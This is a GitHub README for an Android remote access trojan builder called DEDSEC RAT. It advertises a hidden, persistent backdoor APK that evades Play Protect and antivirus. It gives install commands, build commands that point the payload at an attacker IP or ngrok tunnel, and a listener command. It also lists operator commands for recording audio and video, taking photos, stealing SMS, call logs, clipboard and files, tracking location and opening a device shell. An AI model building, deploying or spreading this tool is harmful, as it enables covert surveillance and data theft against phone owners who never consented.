<h1 align="center"> DEDSEC RAT </h1>
<p align="center"> DEDSEC RAT is a tool can create undetectable payload for android 10-12 and control android phone remotely and retrieve informations from it. </p> 

## Features
* Full persistent backdoor
* Google Play Protect bypass
* Fully undetectable by android 10 - 12 antivirus scanner
* Invisible icon on install
* Light weight apk which runs 24*7 in background
* App starts automatically on boot up 
* Can record audio, video, take picture from both camera
* Browse call logs and SMS logs
* Get current location, sim card details ,ip, mac address of the device

## Prerequisites
* Python3 and JAVA (or Android Studio)
* sudo - [ MUST ]

## Installation
```
git clone https://github.com/0xbitx/dedsec-payload-generator.git
cd dedsec-payload-generator
pip install -r requirements.txt
```
### TESTED ON FOLLOWING:
* Kali Linux
* Parrot OS
* Ubuntu
* Arch Linux

### Available Modes
* `--build` - for building the android apk 
* `--ngrok` - for using ngrok tunnel (over the internet)
* `--shell` - getting an interactive shell of the device

### `build` mode

```
Usage:
  sudo python3 dedsec-fud.py --build --ngrok [flags]
  Flags:
    -p, --port              Attacker port number (optional by default its set to 8000)
    -o, --output            Name for the apk file (optional by default its set to "dedsec-payload.apk")
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

```
Usage:
  sudo python3 dedsec-fud.py --build [flags]
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

Or you can manually build the apk by importing [Android Code](Android_Code) folder to Android Studio and changing the IP address and port number in [config.java](Android_Code/app/src/main/java/com/example/reverseshell2/config.java) file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`
### `shell` mode
```
Usage:
  sudo python3 dedsec-fud.py --shell [flags]
  Flags:
    -i, --ip                Listner IP address
    -p, --port              Listner port number
```
After running the `shell` mode you will get an interpreter of the device  

Commands which can run on the interpreter
```
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a sh shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
```
In the sh shell there are some sub commands
```
    get [full_file_path]        --> donwloads the file to the local machine (file size upto 15mb)
    put [filename]              --> uploads the file to the android device
```

## Examples

* To build the apk using ngrok which will also set the listner:
```sudo python3 dedsec-fud.py --build --ngrok -o payload.apk```

* To build the apk using desired ip and port:
```sudo python3 dedsec-fud.py --build -i 192.169.x.x -p 8000 -o payload.apk```

* To get the interpreter:
```sudo python3 dedsec-fud.py --shell -i 0.0.0.0 -p 8000```
 

<h1 align="center"> DISCLAIMER </h1>

<h4 align="center">I'm not responsible for anything you do with this program, so please only use it for good and educational purposes. </h4>

